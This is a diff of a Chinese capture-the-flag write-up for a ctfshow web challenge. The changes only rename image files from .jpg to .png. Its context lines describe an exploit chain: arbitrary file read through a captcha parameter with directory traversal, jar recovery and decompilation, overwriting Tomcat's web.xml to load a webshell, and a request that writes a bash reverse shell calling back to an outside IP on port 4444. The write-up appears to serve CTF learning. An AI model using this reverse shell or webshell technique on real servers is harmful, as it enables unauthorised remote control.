@@ -82,7 +82,7 @@ tyros4qws3mmbubgjqje46ncv35jaqjgeb3nqiuf23ijoj4zwasxohyd.onion
 
 一直注册登录不上，然后发现验证码始终不变，验证码的地方存在任意文件读取，base形式的
 
-![image](./assets/001.jpg)
+![image](./assets/001.png)
 
 别忘了目录穿越，我就是忘了，然后一直在这里试这个东西
 
@@ -201,7 +201,7 @@ Connection: close
 
 读取之后要进行jar包的修复
 
-![image](./assets/002.jpg)
+![image](./assets/002.png)
 
 先保存`jar`包下来，也就是在这里我知道了，上一篇文章我为啥要删除
 
@@ -213,11 +213,11 @@ Connection: close
 
 ![image](./assets/003.jpg)
 
-![image](./assets/004.jpg)
+![image](./assets/004.png)
 
 但是一直搞不好，后面问了一些师傅，P爹告诉说，直接010新建十六进制文件，然后`ctrl+shift+v`最后把补包补好即可，如图
 
-![image](./assets/005.jpg)
+![image](./assets/005.png)
 
 然后成功反编译了，现在我们就审计代码就好了，一进来就看到了这个
 
@@ -298,7 +298,7 @@ v=com.ctfshow.controller.Validate
 
 由于`Tomcat`的热加载机制，我们可以覆盖`web.xml`来加载我们的木马
 
-![image](./assets/007.jpg)
+![image](./assets/007.png)
 
 ```
 username=web.xml&password=<?xml version="1.0" encoding="UTF-8"?>
@@ -341,7 +341,7 @@ out.println(dir);
 
 然后访问我们在`xml`里面写的`ctfshow`，然后就可以得到路径了
 
-![image](./assets/008.jpg)
+![image](./assets/008.png)
 
 我们写个sh来弹shell，就很方便
 
@@ -363,5 +363,5 @@ username=1.sh&password=bash -i %3E%26 /dev/tcp/156.238.233.9/4444 0%3E%261
 
 然后访问`/ctfshow`进行触发
 
-![image](./assets/009.jpg)
+![image](./assets/009.png)
 
